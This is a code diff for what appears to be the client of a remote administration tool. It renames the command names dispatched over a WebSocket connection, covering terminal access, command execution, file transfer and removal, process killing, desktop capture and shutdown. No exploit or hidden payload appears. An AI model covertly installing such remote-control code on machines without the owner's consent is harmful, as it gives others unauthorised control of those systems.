@@ -17,32 +17,32 @@ import (
 )
 
 var handlers = map[string]func(pack modules.Packet, wsConn *common.Conn){
-	`ping`:           ping,
-	`offline`:        offline,
-	`lock`:           lock,
-	`logoff`:         logoff,
-	`hibernate`:      hibernate,
-	`suspend`:        suspend,
-	`restart`:        restart,
-	`shutdown`:       shutdown,
-	`screenshot`:     screenshot,
-	`initTerminal`:   initTerminal,
-	`inputTerminal`:  inputTerminal,
-	`resizeTerminal`: resizeTerminal,
-	`pingTerminal`:   pingTerminal,
-	`killTerminal`:   killTerminal,
-	`listFiles`:      listFiles,
-	`fetchFile`:      fetchFile,
-	`removeFiles`:    removeFiles,
-	`uploadFiles`:    uploadFiles,
-	`uploadTextFile`: uploadTextFile,
-	`listProcesses`:  listProcesses,
-	`killProcess`:    killProcess,
-	`initDesktop`:    initDesktop,
-	`pingDesktop`:    pingDesktop,
-	`killDesktop`:    killDesktop,
-	`getDesktop`:     getDesktop,
-	`execCommand`:    execCommand,
+	`PING`:             ping,
+	`OFFLINE`:          offline,
+	`LOCK`:             lock,
+	`LOGOFF`:           logoff,
+	`HIBERNATE`:        hibernate,
+	`SUSPEND`:          suspend,
+	`RESTART`:          restart,
+	`SHUTDOWN`:         shutdown,
+	`SCREENSHOT`:       screenshot,
+	`TERMINAL_INIT`:    initTerminal,
+	`TERMINAL_INPUT`:   inputTerminal,
+	`TERMINAL_RESIZE`:  resizeTerminal,
+	`TERMINAL_PING`:    pingTerminal,
+	`TERMINAL_KILL`:    killTerminal,
+	`FILES_LIST`:       listFiles,
+	`FILES_FETCH`:      fetchFile,
+	`FILES_REMOVE`:     removeFiles,
+	`FILES_UPLOAD`:     uploadFiles,
+	`FILE_UPLOAD_TEXT`: uploadTextFile,
+	`PROCESSES_LIST`:   listProcesses,
+	`PROCESS_KILL`:     killProcess,
+	`DESKTOP_INIT`:     initDesktop,
+	`DESKTOP_PING`:     pingDesktop,
+	`DESKTOP_KILL`:     killDesktop,
+	`DESKTOP_SHOT`:     getDesktop,
+	`COMMAND_EXEC`:     execCommand,
 }
 
 func ping(pack modules.Packet, wsConn *common.Conn) {
@@ -52,7 +52,7 @@ func ping(pack modules.Packet, wsConn *common.Conn) {
 		golog.Error(err)
 		return
 	}
-	wsConn.SendPack(modules.CommonPack{Act: `setDevice`, Data: *device})
+	wsConn.SendPack(modules.CommonPack{Act: `DEVICE_UPDATE`, Data: *device})
 }
 
 func offline(pack modules.Packet, wsConn *common.Conn) {
@@ -133,9 +133,9 @@ func screenshot(pack modules.Packet, wsConn *common.Conn) {
 func initTerminal(pack modules.Packet, wsConn *common.Conn) {
 	err := terminal.InitTerminal(pack)
 	if err != nil {
-		wsConn.SendCallback(modules.Packet{Act: `initTerminal`, Code: 1, Msg: err.Error()}, pack)
+		wsConn.SendCallback(modules.Packet{Act: `TERMINAL_INIT`, Code: 1, Msg: err.Error()}, pack)
 	} else {
-		wsConn.SendCallback(modules.Packet{Act: `initTerminal`, Code: 0}, pack)
+		wsConn.SendCallback(modules.Packet{Act: `TERMINAL_INIT`, Code: 0}, pack)
 	}
 }
 
@@ -322,9 +322,9 @@ func killProcess(pack modules.Packet, wsConn *common.Conn) {
 func initDesktop(pack modules.Packet, wsConn *common.Conn) {
 	err := desktop.InitDesktop(pack)
 	if err != nil {
-		wsConn.SendCallback(modules.Packet{Act: `initDesktop`, Code: 1, Msg: err.Error()}, pack)
+		wsConn.SendCallback(modules.Packet{Act: `DESKTOP_INIT`, Code: 1, Msg: err.Error()}, pack)
 	} else {
-		wsConn.SendCallback(modules.Packet{Act: `initDesktop`, Code: 0}, pack)
+		wsConn.SendCallback(modules.Packet{Act: `DESKTOP_INIT`, Code: 0}, pack)
 	}
 }
 
